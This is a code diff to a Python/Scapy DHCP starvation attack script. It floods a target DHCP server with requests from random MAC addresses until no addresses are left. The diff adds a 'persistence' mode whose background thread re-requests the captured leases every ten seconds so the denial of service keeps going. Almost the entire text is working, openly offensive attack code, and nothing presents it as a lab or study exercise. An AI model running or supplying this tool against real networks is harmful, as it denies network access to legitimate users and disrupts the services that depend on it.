@@ -1,8 +1,10 @@
 import argparse
 import subprocess
+import threading
+import time
 from scapy.all import conf, Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, sniff, ARP, srp
 
-
+lease = {}
 def get_dhcp_server_ip(iface):
     pkt = (
         Ether(dst="FF:FF:FF:FF:FF:FF") /
@@ -17,10 +19,34 @@ def get_dhcp_server_ip(iface):
     if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 2:
         return pkt[IP].src
     return None
+##todo - make the thread work on copy of lease dict
+def renew_leases(iface, target_ip):
+    global lease
+    while True:
+        for ip, mac in lease.items():
+            pkt_request = (
+                Ether(src=mac, dst="FF:FF:FF:FF:FF:FF") /
+                IP(src='0.0.0.0', dst=target_ip) /
+                UDP(sport=68, dport=67) /
+                BOOTP(chaddr=mac) /
+                DHCP(options=[('message-type', 'request'),
+                              ('requested_addr', ip),   
+                              ('server_id', target_ip), 
+                                'end'])
+            )
+            sendp(pkt_request, iface=iface, verbose=0)
+        time.sleep(10)
 
-
-def attack_dhcp_server(iface, target_ip):
+def attack_dhcp_server(iface, target_ip, persistence=False): 
+    global lease
     print(f"Starting DHCP Starvation Attack on {target_ip} ...")
+    if persistence:
+        print("--- Persistence Mode ENABLED ---")
+        t =threading.Thread(target=renew_leases, args=(iface, target_ip))
+        t.daemon = True
+        t.start()
+
+
     while True:
         mac = RandMAC()
         pkt_discover = (
@@ -36,6 +62,11 @@ def attack_dhcp_server(iface, target_ip):
             ans = offer_pkt[0]
             offered_ip = ans[BOOTP].yiaddr
             print(f"Requested IP: {offered_ip} with MAC: {mac}")
+            
+            if persistence:
+                lease[offered_ip] = mac
+
+
             pkt_request = (
                 Ether(src=mac, dst="FF:FF:FF:FF:FF:FF") /
                 IP(src='0.0.0.0', dst=target_ip) /
@@ -52,10 +83,19 @@ def attack_dhcp_server(iface, target_ip):
 
 
 def main():
+    
     argv_parser = argparse.ArgumentParser(
         prog='DHCPStarvationNEW.py',
         description='DHCP Starvation',
         formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+
+    
+    argv_parser.add_argument(
+        '-p', '--persist',
+        action='store_true', 
+        help='persistant?',   
+        required=False
     )
 
     argv_parser.add_argument(
@@ -82,7 +122,9 @@ def main():
         exit(0)
 
     print(f"Checking: IFACE: {iface} | Target IP: {tar_ip}")
-    attack_dhcp_server(iface, tar_ip)
+    
+    # העברת מצב הדגל לפונקציה הראשית
+    attack_dhcp_server(iface, tar_ip, argv.persist)
 
 
 if __name__ == "__main__":
